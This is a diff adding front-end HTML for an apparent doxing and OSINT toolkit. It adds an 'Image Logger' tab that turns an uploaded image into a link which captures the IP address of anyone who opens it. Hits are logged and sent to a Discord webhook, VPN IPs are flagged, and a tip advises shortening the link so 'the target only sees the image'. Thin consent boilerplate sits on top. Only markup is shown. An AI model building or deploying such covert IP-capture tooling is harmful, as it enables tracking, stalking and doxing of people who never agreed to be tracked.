@@ -79,6 +79,18 @@
         <span class="nav-icon">◉</span>
         <span class="nav-label">OSN | SEARCH</span>
       </button>
+      <button class="nav-btn" data-tab="logger">
+        <span class="nav-icon">◈</span>
+        <span class="nav-label rainbow-nav">LOG | CREATION</span>
+      </button>
+      <button class="nav-btn" data-tab="logs">
+        <span class="nav-icon">◎</span>
+        <span class="nav-label">LOGS</span>
+      </button>
+      <button class="nav-btn" data-tab="chat">
+        <span class="nav-icon">◇</span>
+        <span class="nav-label">GLOBAL | CHAT</span>
+      </button>
     </nav>
     <div id="sidebar-footer">
       <div id="user-info">
@@ -246,6 +258,154 @@
 
       <!-- Exposure score summary -->
       <div id="osint-summary-card" class="osint-summary-card hidden"></div>
+    </section>
+
+    <!-- ── LOG | CREATION TAB ── -->
+    <section id="tab-logger" class="tab-panel">
+      <!-- Agreement overlay -->
+      <div id="logger-agreement" class="tab-overlay">
+        <div class="tab-modal-box">
+          <div class="tab-modal-hdr">TERMS OF USE — IMAGE LOGGER</div>
+          <div class="tab-modal-body">
+            <p class="agree-intro">Read and agree before using the Image Logger tool:</p>
+            <ol class="agree-list">
+              <li>This tool is for <strong>educational and security testing purposes only</strong>.</li>
+              <li>You may ONLY use this logger on yourself or with <strong>explicit written consent</strong> from the subject.</li>
+              <li>Capturing IPs without consent is illegal in many jurisdictions and may result in criminal charges.</li>
+              <li>You agree to comply with all applicable local, national, and international laws.</li>
+              <li>The developers of /fpeds accept <strong>zero liability</strong> for any misuse of this tool.</li>
+              <li>VPN and proxy IPs will also be logged and reported to your webhook.</li>
+              <li>You agree not to use this for harassment, stalking, doxing, or any harmful purpose.</li>
+              <li>All logs are stored on this server — you are responsible for managing them.</li>
+              <li>Webhook data is transmitted at your own risk.</li>
+              <li>Clicking "I Agree" means you accept <strong>full legal responsibility</strong> for how you use this tool.</li>
+            </ol>
+          </div>
+          <div class="tab-modal-ftr">
+            <button id="agree-decline-btn" class="btn-ghost">Decline</button>
+            <button id="agree-accept-btn" class="btn-primary btn-glow">I Agree — Enter</button>
+          </div>
+        </div>
+      </div>
+      <!-- Main content -->
+      <div id="logger-main" class="hidden">
+        <div class="panel-header">
+          <h1><span class="rainbow-text">LOG | CREATION</span></h1>
+          <p class="subtitle">Upload an image → get a logger URL → when someone opens it, their IP is captured</p>
+        </div>
+        <div class="tip-bar">
+          <span class="tip-icon">⬡</span>
+          Shorten your logger URL with <a href="https://www.hostyurl.com/" target="_blank" rel="noopener" class="tip-link">hostyurl.com</a> — the target only sees the image, never the real URL structure.
+        </div>
+        <div class="logger-form card-anim">
+          <div class="form-section-title">New Logger</div>
+          <input id="logger-name" type="text" class="osint-input" placeholder="Logger name (e.g. Discord Test)" maxlength="80" autocomplete="off" style="margin-bottom:12px"/>
+          <div class="drop-zone" id="logger-drop-zone">
+            <input type="file" id="logger-file-input" accept="image/*" style="display:none"/>
+            <div class="drop-icon">⬡</div>
+            <div class="drop-label">Drop image here or <span class="drop-click">click to browse</span></div>
+            <div class="drop-sub">Any size · JPG PNG GIF WEBP SVG</div>
+            <div id="logger-preview-wrap" class="logger-preview-wrap hidden">
+              <img id="logger-preview-img" class="logger-preview-img" alt=""/>
+              <span id="logger-preview-name" class="logger-preview-name"></span>
+            </div>
+          </div>
+          <div class="logger-actions">
+            <button id="logger-create-btn" class="btn-primary btn-glow" disabled>Generate Logger Link</button>
+            <span id="logger-create-status" class="status-msg"></span>
+          </div>
+        </div>
+        <div id="logger-result" class="logger-result card-anim hidden">
+          <div class="lr-title">Logger Ready</div>
+          <div class="lr-url-row">
+            <span class="lr-label">LOGGER URL</span>
+            <input id="logger-url-out" class="lr-url-field" readonly/>
+            <button id="logger-copy-url" class="btn-ghost">Copy</button>
+          </div>
+          <div class="lr-note">Share this link. When opened → image shown, IP captured, webhook fires.</div>
+        </div>
+        <div id="logger-list-section" class="hidden" style="margin-top:24px">
+          <div class="found-header">
+            <span class="found-title">Your Loggers</span>
+            <button id="logger-refresh-btn" class="btn-ghost">Refresh</button>
+          </div>
+          <div id="logger-list" class="logger-list"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── LOGS TAB ── -->
+    <section id="tab-logs" class="tab-panel">
+      <div class="panel-header">
+        <h1>LOGS</h1>
+        <p class="subtitle">All captured IP hits from your image loggers</p>
+      </div>
+      <div class="card-anim webhook-section">
+        <div class="form-section-title">Discord Webhook</div>
+        <div class="webhook-row">
+          <input id="webhook-url-input" type="text" class="osint-input" placeholder="https://discord.com/api/webhooks/..." autocomplete="off"/>
+          <button id="webhook-save-btn" class="btn-primary">Save</button>
+          <button id="webhook-test-btn" class="btn-ghost">Test</button>
+        </div>
+        <div id="webhook-status" class="status-msg" style="margin-top:6px"></div>
+        <div class="webhook-info">On every IP hit: sends a Discord embed — title "NEW | HIT", /fpeds | credits @vet, no emojis. VPN IPs flagged as "VPN IP DETECTED".</div>
+      </div>
+      <div class="logs-controls">
+        <div class="form-section-title" style="margin:0">Captured IPs <span id="logs-count-badge" class="osint-count-badge"></span></div>
+        <div class="found-actions">
+          <button id="logs-refresh-btn" class="btn-ghost">Refresh</button>
+          <button id="logs-export-btn" class="btn-ghost">Export .txt</button>
+          <button id="logs-clear-btn" class="btn-ghost danger-ghost">Clear All</button>
+        </div>
+      </div>
+      <div id="logs-list" class="logs-list card-anim">
+        <div class="logs-empty">No logs yet — create a logger, share the link, and IPs will appear here.</div>
+      </div>
+    </section>
+
+    <!-- ── GLOBAL | CHAT TAB ── -->
+    <section id="tab-chat" class="tab-panel">
+      <!-- Rules overlay -->
+      <div id="chat-rules-modal" class="tab-overlay">
+        <div class="tab-modal-box">
+          <div class="tab-modal-hdr">GLOBAL | CHAT — RULES</div>
+          <div class="tab-modal-body">
+            <p class="agree-intro">By entering the chat, you agree to follow these rules:</p>
+            <ol class="agree-list">
+              <li>No harassment, hate speech, or threats toward any user.</li>
+              <li>No doxing — never share anyone's personal information.</li>
+              <li>No spam or repeated flooding of messages.</li>
+              <li>No links to illegal content or malware.</li>
+              <li>No impersonating other users.</li>
+              <li>Keep it civil — disagreements are fine, abuse is not.</li>
+              <li>No advertising without permission.</li>
+              <li>Never share passwords, tokens, or credentials in chat.</li>
+              <li>Violations may result in account suspension.</li>
+              <li>This is a global room — all logged-in users see your messages.</li>
+            </ol>
+          </div>
+          <div class="tab-modal-ftr">
+            <button id="chat-rules-accept" class="btn-primary btn-glow">Accept — Enter Chat</button>
+          </div>
+        </div>
+      </div>
+      <!-- Chat main -->
+      <div id="chat-main" class="hidden">
+        <div class="panel-header">
+          <h1>GLOBAL | CHAT</h1>
+          <p class="subtitle">Real-time global chat — <span id="chat-online-count" class="chat-online-badge">connecting...</span></p>
+        </div>
+        <div class="chat-wrap card-anim">
+          <div id="chat-messages" class="chat-messages"></div>
+          <div class="chat-input-row">
+            <input id="chat-input" type="text" class="chat-input" placeholder="Message everyone..." maxlength="500" autocomplete="off"/>
+            <button id="chat-send-btn" class="btn-primary btn-glow">Send</button>
+          </div>
+          <div class="chat-footer-bar">
+            <span id="chat-char-left" class="chat-char-left">500</span>
+          </div>
+        </div>
+      </div>
     </section>
 
   </main>
